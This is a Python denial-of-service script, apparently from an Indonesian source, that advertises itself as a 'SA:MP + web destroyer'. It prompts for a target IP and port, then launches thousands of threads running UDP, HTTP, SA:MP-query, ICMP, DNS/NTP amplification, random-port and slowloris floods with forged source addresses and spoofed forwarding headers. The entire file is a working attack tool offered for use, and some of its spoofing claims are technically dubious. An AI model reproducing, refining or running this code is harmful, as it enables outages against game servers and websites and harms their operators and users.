#!/usr/bin/env python3
# ZAMZZZ OMNIKILL FIXED - SA:MP + WEB DESTROYER
# BYPASS: IP BLOCK, ANTI-CHEAT, FILTER, FIREWALL
# KETIK: python3 ZAMZZZ_FIX.py

import socket
import random
import threading
import time
import os
import requests
from concurrent.futures import ThreadPoolExecutor

# ========== KONFIGURASI ==========
THREADS = 10000
PACKET_SIZE = 65535
TIMEOUT = 0.01

# ========== SPOOF IP DINAMIS ==========
def spoof():
    prefixes = [
        '1.1.', '8.8.', '9.9.', '10.0.', '31.13.', '34.120.',
        '45.33.', '54.36.', '64.233.', '72.14.', '74.125.',
        '104.16.', '104.20.', '108.177.', '142.250.', '172.217.',
        '173.194.', '192.0.', '192.168.', '198.252.', '199.36.',
        '203.0.', '208.67.', '209.85.', '216.58.', '35.186.',
        '40.77.', '52.112.', '54.39.', '13.32.', '16.15.'
    ]
    prefix = random.choice(prefixes)
    return f"{prefix}{random.randint(1,255)}.{random.randint(1,255)}"

# ========== GENERATE FAKE IPS ==========
def generate_fake_ips(count=5000):
    ips = []
    for _ in range(count):
        ips.append(spoof())
    return ips

FAKE_IPS = generate_fake_ips(5000)
FAKE_IP_INDEX = 0

def get_next_fake_ip():
    global FAKE_IP_INDEX
    ip = FAKE_IPS[FAKE_IP_INDEX]
    FAKE_IP_INDEX = (FAKE_IP_INDEX + 1) % len(FAKE_IPS)
    return ip

# ========== UDP FLOOD ==========
def udp_flood(ip, port):
    while True:
        try:
            sock = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
            sock.setsockopt(socket.SOL_SOCKET, socket.SO_REUSEADDR, 1)
            sock.setsockopt(socket.SOL_SOCKET, socket.SO_SNDBUF, PACKET_SIZE * 100)
            fake_ip = get_next_fake_ip()
            fake_port = random.randint(10000, 65000)
            try:
                sock.bind((fake_ip, fake_port))
            except:
                sock.bind(('', fake_port))
            payload = random._urandom(PACKET_SIZE)
            for p in range(port, port + 50):
                sock.sendto(payload, (ip, p))
                sock.sendto(payload + b'\xff' * 1000, (ip, p + 1))
                sock.sendto(payload + b'\x00' * 2000, (ip, p + 2))
                sock.sendto(b'SAMP' + random._urandom(500), (ip, p + 5))
            sock.close()
            time.sleep(0.001)
        except:
            pass

# ========== HTTP FLOOD ==========
def http_flood(ip, port):
    url = f"http://{ip}:{port}"
    while True:
        try:
            headers = {
                'User-Agent': random.choice(['Mozilla/5.0', 'GoogleBot', 'BingBot']),
                'X-Forwarded-For': get_next_fake_ip(),
                'CF-Connecting-IP': get_next_fake_ip(),
                'True-Client-IP': get_next_fake_ip()
            }
            requests.get(url, headers=headers, timeout=TIMEOUT)
            requests.post(url, data={'z': random._urandom(1024)}, headers=headers, timeout=TIMEOUT)
        except:
            pass

# ========== SA:MP QUERY FLOOD ==========
def samp_flood(ip, port):
    queries = [
        b'SAMP' + b'\x00' + b'\x69\x69\x69\x69' + b'\x63' + b'\x00' * 20,
        b'SAMP' + b'\x00' + b'\x69\x69\x69\x69' + b'\x72' + b'\x00' * 100,
        b'SAMP' + b'\xff' * 100 + b'\x00' * 100,
        b'SAMP' + random._urandom(50) + random._urandom(50)
    ]
    while True:
        try:
            sock = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
            fake_ip = get_next_fake_ip()
            sock.bind((fake_ip, random.randint(10000, 65000)))
            for q in queries:
                sock.sendto(q, (ip, port))
                sock.sendto(q + b'\xff' * 500, (ip, port + 1))
                sock.sendto(q + b'\x00' * 1000, (ip, port + 2))
                sock.sendto(q, (ip, 7776))
            sock.close()
            time.sleep(0.01)
        except:
            pass

# ========== ICMP FLOOD ==========
def icmp_flood(ip):
    while True:
        try:
            sock = socket.socket(socket.AF_INET, socket.SOCK_RAW, socket.IPPROTO_ICMP)
            fake_ip = get_next_fake_ip()
            sock.bind((fake_ip, 0))
        except:
            sock = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
        while True:
            try:
                data = b'\x08\x00\x00\x00\x00\x00\x00\x00' + random._urandom(65000)
                sock.sendto(data, (ip, 0))
                sock.sendto(data, (ip, 1))
                sock.sendto(data, (ip, 2))
            except:
                sock.close()
                break

# ========== AMPLIFICATION ==========
def amp_flood(ip):
    servers = [
        ('8.8.8.8', 53), ('1.1.1.1', 53), ('208.67.222.222', 53),
        ('ntp.ubuntu.com', 123), ('time.google.com', 123)
    ]
    queries = [
        b'\x00\x00\x10\x00\x00\x01\x00\x00\x00\x00\x00\x00\x07version\x04bind\x00\x00\x10\x00\x03',
        b'\x00\x00\x01\x00\x00\x01\x00\x00\x00\x00\x00\x00\x07version\x04bind\x00\x00\x10\x00\x03'
    ]
    while True:
        sock = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
        fake_ip = get_next_fake_ip()
        sock.bind((fake_ip, random.randint(10000, 65000)))
        for target, port in servers:
            for q in queries:
                try:
                    sock.sendto(q, (target, port))
                    sock.sendto(q, (ip, port))
                    sock.sendto(q + b'\xff' * 500, (ip, port + 1))
                except:
                    pass
        sock.close()
        time.sleep(0.1)

# ========== RANDOM PORT FLOOD ==========
def random_port_flood(ip):
    ports = random.sample(range(1, 65535), 1000)
    while True:
        sock = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
        fake_ip = get_next_fake_ip()
        sock.bind((fake_ip, random.randint(10000, 65000)))
        for p in ports:
            try:
                sock.sendto(random._urandom(65500), (ip, p))
                sock.sendto(random._urandom(65500), (ip, p + 1))
            except:
                pass
        sock.close()
        time.sleep(0.01)

# ========== SLOWLORIS ==========
def slowloris(ip, port):
    while True:
        sockets = []
        fake_ip = get_next_fake_ip()
        for _ in range(300):
            try:
                s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
                s.settimeout(4)
                s.bind((fake_ip, 0))
                s.connect((ip, port))
                s.send(f"GET / HTTP/1.1\r\nHost: {ip}\r\nX-Forwarded-For: {get_next_fake_ip()}\r\n".encode())
                sockets.append(s)
            except:
                pass
        while True:
            for s in sockets:
                try:
                    s.send(f"X-{random.randint(1,9999)}: {random.randint(1,9999)}\r\n".encode())
                except:
                    sockets.remove(s)
                    try:
                        new = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
                        new.settimeout(4)
                        new.bind((get_next_fake_ip(), 0))
                        new.connect((ip, port))
                        new.send(f"GET / HTTP/1.1\r\nHost: {ip}\r\nX-Forwarded-For: {get_next_fake_ip()}\r\n".encode())
                        sockets.append(new)
                    except:
                        pass
            time.sleep(10)
            if len(sockets) < 50:
                break

# ========== MAIN ==========
def main():
    os.system('clear' if os.name == 'posix' else 'cls')
    print("""
    ╔═══════════════════════════════════════════════════════════╗
    ║                                                           ║
    ║      🔥 ZAMZZZ OMNIKILL FIXED - SA:MP DESTROYER 🔥       ║
    ║                                                           ║
    ║      [✓] SPOOFING TOTAL (5.000 IP PALSU)                 ║
    ║      [✓] UDP FLOOD                                       ║
    ║      [✓] HTTP FLOOD                                      ║
    ║      [✓] SA:MP QUERY FLOOD                               ║
    ║      [✓] ICMP FLOOD                                      ║
    ║      [✓] AMPLIFICATION                                   ║
    ║      [✓] SLOWLORIS                                       ║
    ║                                                           ║
    ║      💀 SERANGAN DIMULAI 💀                               ║
    ║                                                           ║
    ╚═══════════════════════════════════════════════════════════╝
    """)

    ip = input("IP Target: ")
    port = int(input("Port (default 7777): ") or 7777)

    print(f"\n🔥 SERANG {ip}:{port} DENGAN {THREADS} THREAD 🔥")
    print(f"🔥 PAKAI {len(FAKE_IPS)} IP PALSU 🔥\n")

    with ThreadPoolExecutor(max_workers=THREADS) as executor:
        for _ in range(int(THREADS * 0.25)):
            executor.submit(udp_flood, ip, port)
        for _ in range(int(THREADS * 0.15)):
            executor.submit(http_flood, ip, port)
        for _ in range(int(THREADS * 0.15)):
            executor.submit(samp_flood, ip, port)
        for _ in range(int(THREADS * 0.15)):
            executor.submit(icmp_flood, ip)
        for _ in range(int(THREADS * 0.15)):
            executor.submit(amp_flood, ip)
        for _ in range(int(THREADS * 0.1)):
            executor.submit(random_port_flood, ip)
        for _ in range(int(THREADS * 0.05)):
            executor.submit(slowloris, ip, port)

    count = 0
    while True:
        count += 1
        print(f"[ZAMZZZ] 🔥 SERANGAN KE-{count} RIBU - {ip}:{port} 🔥")
        time.sleep(1)

if __name__ == "__main__":
    main()